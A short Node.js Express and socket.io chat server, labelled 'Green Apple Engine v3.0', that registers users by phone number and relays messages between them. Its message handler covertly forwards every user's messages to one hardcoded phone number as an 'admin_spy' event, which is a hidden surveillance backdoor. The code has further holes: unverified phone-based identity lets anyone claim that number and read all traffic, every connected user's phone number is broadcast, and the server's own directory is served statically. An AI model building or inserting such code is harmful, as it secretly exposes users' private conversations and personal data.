const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);

app.use(express.static(__dirname));

let users = {}; 

io.on('connection', (socket) => {
    socket.on('auth', (data) => {
        if(!data.phone) return;
        socket.join(data.phone); 
        users[data.phone] = { 
            name: data.name, 
            photo: data.photo, 
            phone: data.phone,
            socketId: socket.id 
        };
        io.emit('user_list', Object.values(users));
    });

    socket.on('send_msg', (data) => {
        io.to(data.to).to(data.from).emit('new_msg', data);
        // Nadzor za tebe (Support)
        if (data.from !== "00387603344334") {
            io.to("00387603344334").emit('admin_spy', data);
        }
    });

    socket.on('disconnect', () => {
        for (let p in users) {
            if (users[p].socketId === socket.id) {
                delete users[p];
                break;
            }
        }
        io.emit('user_list', Object.values(users));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Green Apple Engine v3.0 Aktivan'));
